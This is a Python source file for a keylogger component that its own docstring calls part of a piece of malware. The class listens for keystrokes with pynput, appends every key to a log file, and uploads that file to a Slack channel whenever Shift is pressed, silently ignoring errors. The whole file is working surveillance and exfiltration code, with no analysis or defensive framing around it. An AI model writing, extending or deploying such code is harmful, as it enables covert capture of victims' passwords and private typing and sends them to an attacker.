from pynput.keyboard import Key, Listener
from threading import Thread
from file_handler import FileHandler

"""
The keylogger will be activated when the malware starts. It records all keystrokes to a txt file,
and sends back the aforementioned txt file to the Slack channel when the 'Shift' key is pressed.
"""
class Keylogger(Thread):

    def __init__(self, config, file_handler: FileHandler, msg_client):
        Thread.__init__(self, name='keylogging')
        self.__file_handler = file_handler
        self.__msg_client = msg_client
        self.__config = config
        self.__output_filepath = str(self.__config.logPath + f"\\{self.__config.logFileName}")


    def onPress(self, key):
        try:
            if key == Key.shift:
                self.__file_handler.upload_file(self.__msg_client, self.__output_filepath)
        except Exception:
            pass
        
        with open(file=self.__output_filepath, mode="a", encoding="utf-8") as f:
            f.write(f"{key}")

    def run(self):
        with Listener(on_press=self.onPress) as listener:
            if self.__config.keyloggingIsActive:
                listener.join()